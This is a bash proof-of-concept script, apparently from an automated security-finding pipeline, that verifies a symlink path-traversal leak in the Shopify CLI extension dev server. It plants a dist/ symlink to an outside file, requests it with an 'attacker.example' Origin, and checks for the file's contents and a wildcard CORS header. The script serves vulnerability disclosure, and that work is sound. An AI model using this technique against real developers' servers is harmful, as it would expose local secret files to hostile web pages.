#!/usr/bin/env bash
set -euo pipefail

FINDING_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "$FINDING_DIR/../../.." && pwd)"
EVIDENCE_DIR="$FINDING_DIR/evidence"
mkdir -p "$EVIDENCE_DIR"

cat > "$EVIDENCE_DIR/setup.sh" <<'SETUP'
#!/usr/bin/env bash
set -euo pipefail
# Required once in a clean checkout before running ../poc.sh
pnpm install --frozen-lockfile
SETUP
chmod +x "$EVIDENCE_DIR/setup.sh"

cat > "$EVIDENCE_DIR/exploit.sh" <<'EXPLOIT'
#!/usr/bin/env bash
set -euo pipefail
cd "$(dirname "$0")/.."
./poc.sh
EXPLOIT
chmod +x "$EVIDENCE_DIR/exploit.sh"

{
  echo "repo_root=$REPO_ROOT"
  echo "git_commit=$(git -C "$REPO_ROOT" rev-parse HEAD 2>/dev/null || echo unknown)"
  echo "date_utc=$(date -u '+%Y-%m-%dT%H:%M:%SZ')"
  echo "node=$(node --version 2>/dev/null || echo missing)"
  echo "pnpm=$(pnpm --version 2>/dev/null || echo missing)"
  echo "node_modules=$([ -d "$REPO_ROOT/node_modules" ] && echo present || echo missing)"
} > "$EVIDENCE_DIR/env-info.txt"

if ! command -v pnpm >/dev/null 2>&1; then
  echo "pnpm is not available; cannot execute the TypeScript application stack." > "$EVIDENCE_DIR/setup.log"
  echo "blocked: pnpm missing" > "$EVIDENCE_DIR/healthcheck.log"
  echo "No runtime impact captured because pnpm is unavailable." > "$EVIDENCE_DIR/impact.log"
  echo "pnpm missing; runtime not executed" > "$EVIDENCE_DIR/exploit.log"
  printf '%s\n' '{"status":"inconclusive","evidence":"pnpm missing; runtime not executed","notes":"install pnpm and repository dependencies, then rerun poc.sh"}'
  exit 0
fi

if [ ! -d "$REPO_ROOT/node_modules" ]; then
  {
    echo "node_modules is absent in this checkout."
    echo "Run: pnpm install --frozen-lockfile"
  } > "$EVIDENCE_DIR/setup.log"
  echo "blocked: dependencies missing; actual h3/dev-server stack cannot be loaded" > "$EVIDENCE_DIR/healthcheck.log"
  cat > "$EVIDENCE_DIR/impact.log" <<'IMPACT'
Runtime execution was not attempted in this checkout because dependencies are not installed.
The PoC script below exercises the real setupHTTPServer() / getExtensionAssetMiddleware() stack when dependencies are present:
1. create extension output dir dist/
2. create dist/leak.txt -> ../developer-secret.txt symlink
3. start the extension dev HTTP server on an ephemeral localhost port
4. GET /extensions/poc-extension/assets/leak.txt with an attacker Origin header
5. confirm the HTTP response body contains the outside-file marker and CORS is wildcard
IMPACT
  echo "node_modules missing; runtime not executed" > "$EVIDENCE_DIR/exploit.log"
  printf '%s\n' '{"status":"inconclusive","evidence":"node_modules missing; runtime not executed","notes":"run pnpm install --frozen-lockfile and rerun poc.sh"}'
  exit 0
fi

echo "dependencies present; running actual Shopify CLI extension dev HTTP stack" > "$EVIDENCE_DIR/setup.log"

RUNNER="$(mktemp "$REPO_ROOT/packages/app/src/cli/services/dev/extension/poc-runner.XXXXXX.test.ts")"
RESULT_JSON="$EVIDENCE_DIR/result.json"
rm -f "$RESULT_JSON"
cleanup_runner() { rm -f "$RUNNER"; }
trap cleanup_runner EXIT

cat > "$RUNNER" <<'TS'
import {mkdtemp, mkdir, writeFile, symlink, rm} from 'node:fs/promises'
import {tmpdir} from 'node:os'
import {join} from 'node:path'
import {once} from 'node:events'
import {test} from 'vitest'
import {setupHTTPServer} from '__SHOPIFY_CLI_SERVER_TS__'

test('extension asset route follows an output-dir symlink and returns the target file', async () => {
  const resultPath = process.env.PIOLIUM_RESULT
  const marker = `PIOLIUM_SYMLINK_LEAK_${process.pid}_${Date.now()}`
  const tmp = await mkdtemp(join(tmpdir(), 'shopify-cli-symlink-poc-'))
  let server: ReturnType<typeof setupHTTPServer> | undefined

  const writeResult = async (result: {status: string; evidence: string; notes?: string}) => {
    if (resultPath) await writeFile(resultPath, JSON.stringify(result), 'utf8')
  }

  try {
    const extDir = join(tmp, 'malicious-extension')
    const outputDir = join(extDir, 'dist')
    await mkdir(outputDir, {recursive: true})

    const secretPath = join(tmp, 'developer-secret.txt')
    const symlinkPath = join(outputDir, 'leak.txt')
    await writeFile(secretPath, marker, 'utf8')
    await symlink(secretPath, symlinkPath)

    const extension = {
      devUUID: 'poc-extension',
      outputPath: join(outputDir, 'main.js'),
      directory: extDir,
      outputFileName: 'main.js',
      type: 'product_subscription',
      configuration: {},
      isPreviewable: true,
    }

    const payloadStore = {
      getAssetResolver: () => undefined,
      getRawPayload: () => ({app: {}, appId: 'poc', store: 'poc.myshopify.com', extensions: []}),
    }

    const devOptions = {
      port: 0,
      url: 'http://localhost',
      stdout: {write: () => true},
      appWatcher: {buildOutputPath: outputDir},
      apiKey: '[REDACTED:secret]',
      manifestVersion: 'poc',
      extensions: [extension],
    }

    server = setupHTTPServer({devOptions, payloadStore, getExtensions: () => [extension]} as any)
    await once(server, 'listening')
    const address = server.address()
    const port = typeof address === 'object' && address ? address.port : 0
    const url = `http://localhost:${port}/extensions/${extension.devUUID}/assets/leak.txt`

    const res = await fetch(url, {headers: {Origin: 'https://attacker.example'}})
    const body = await res.text()
    const cors = res.headers.get('access-control-allow-origin') ?? ''
    const confirmed = res.status === 200 && body === marker

    const result = {
      status: confirmed ? 'confirmed' : 'failed',
      evidence: confirmed
        ? 'HTTP asset response contained outside-file marker via output-dir symlink'
        : `unexpected HTTP ${res.status} body=${body.slice(0, 120)}`,
      notes: `url=${url}; cors=${cors}; marker=${marker}; symlink=${symlinkPath}; target=${secretPath}`,
    }
    await writeResult(result)
    if (!confirmed) throw new Error(JSON.stringify(result))
  } catch (error) {
    const message = error instanceof Error ? error.message : String(error)
    await writeResult({status: 'failed', evidence: 'PoC runner threw before observing leak', notes: message})
    throw error
  } finally {
    await new Promise<void>((resolve) => {
      if (server) server.close(() => resolve())
      else resolve()
    })
    await rm(tmp, {recursive: true, force: true}).catch(() => {})
  }
}, 30000)
TS

SERVER_TS="$REPO_ROOT/packages/app/src/cli/services/dev/extension/server.ts"
perl -0pi -e "s#__SHOPIFY_CLI_SERVER_TS__#$SERVER_TS#g" "$RUNNER"

if ! (cd "$REPO_ROOT" && pnpm exec vitest --version >/dev/null 2>&1); then
  echo "vitest is not available from installed dependencies." > "$EVIDENCE_DIR/healthcheck.log"
  echo "vitest unavailable" > "$EVIDENCE_DIR/exploit.log"
  printf '%s\n' '{"status":"inconclusive","evidence":"Vitest TypeScript runner unavailable","notes":"install workspace dependencies and rerun poc.sh"}'
  exit 0
fi

echo "healthcheck: vitest available; starting dev server PoC" > "$EVIDENCE_DIR/healthcheck.log"
set +e
OUTPUT="$(cd "$REPO_ROOT" && PIOLIUM_RESULT="$RESULT_JSON" pnpm vitest run "$RUNNER" --reporter=dot 2>&1)"
RC=$?
set -e
printf '%s\n' "$OUTPUT" > "$EVIDENCE_DIR/exploit.log"

if [ -s "$RESULT_JSON" ]; then
  JSON_LINE="$(cat "$RESULT_JSON")"
elif [ "$RC" -ne 0 ]; then
  JSON_LINE='{"status":"failed","evidence":"PoC runner exited non-zero before writing result","notes":"see evidence/exploit.log"}'
else
  JSON_LINE='{"status":"failed","evidence":"PoC runner did not emit structured JSON","notes":"see evidence/exploit.log"}'
fi

printf '%s\n' "$OUTPUT"
printf '%s\n' "$JSON_LINE" >> "$EVIDENCE_DIR/exploit.log"
printf '%s\n' "$JSON_LINE" > "$EVIDENCE_DIR/impact.log"
printf '%s\n' "$JSON_LINE"
